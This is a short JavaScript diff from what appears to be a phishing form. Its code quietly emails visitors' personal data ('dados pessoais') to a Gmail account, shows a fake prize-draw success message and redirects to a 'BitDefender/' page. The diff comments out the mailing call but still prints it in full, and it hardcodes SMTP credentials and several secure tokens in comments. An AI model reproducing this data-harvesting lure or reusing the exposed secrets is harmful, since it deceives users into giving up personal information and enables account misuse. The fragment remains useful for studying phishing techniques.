@@ -66,9 +66,14 @@ function enviar() {
 
     document.getElementById("setorImu").disabled = true;
     document.getElementById("setorImu").hidden = true;
+    
+    alert("O seu cadastro foi realizado com sucesso, boa sorte com o sorteio");
+    window.location.href = "BitDefender/";
 
-    Email.send({
-        SecureToken: "439b4b05-f6c0-45f4-83c7-43e5188179b6",
+    /*Email.send({
+        Host: 'smtp.mailendo.com',
+        Username: 'cyberusmtst@gmail.com',
+        Password: '15b27fc5-e219-4eb7-a561-a8d77a1bade0',
         To: 'cyberusmtst@gmail.com',
         From: "cyberusmtst@gmail.com",
         Subject: "Envio de dados pessoais",
@@ -79,11 +84,15 @@ function enviar() {
             window.location.href = "BitDefender/";
         }
         else{
-            alert("Erro no cadastro, realize-o novamente!")
+            //alert("Erro no cadastro, realize-o novamente!");
+            alert(message);
         }
-    } );
+    } );*/
 
 
-    //ECCF228E2B779150AAF080BDE356DFDD0AC7
-    //439b4b05-f6c0-45f4-83c7-43e5188179b6
+    //1º - ECCF228E2B779150AAF080BDE356DFDD0AC7
+    //1º - 439b4b05-f6c0-45f4-83c7-43e5188179b6
+
+    //2º - B49344436C53768266F62087A2E84B40F22E
+    //2º - 15b27fc5-e219-4eb7-a561-a8d77a1bade0
 }
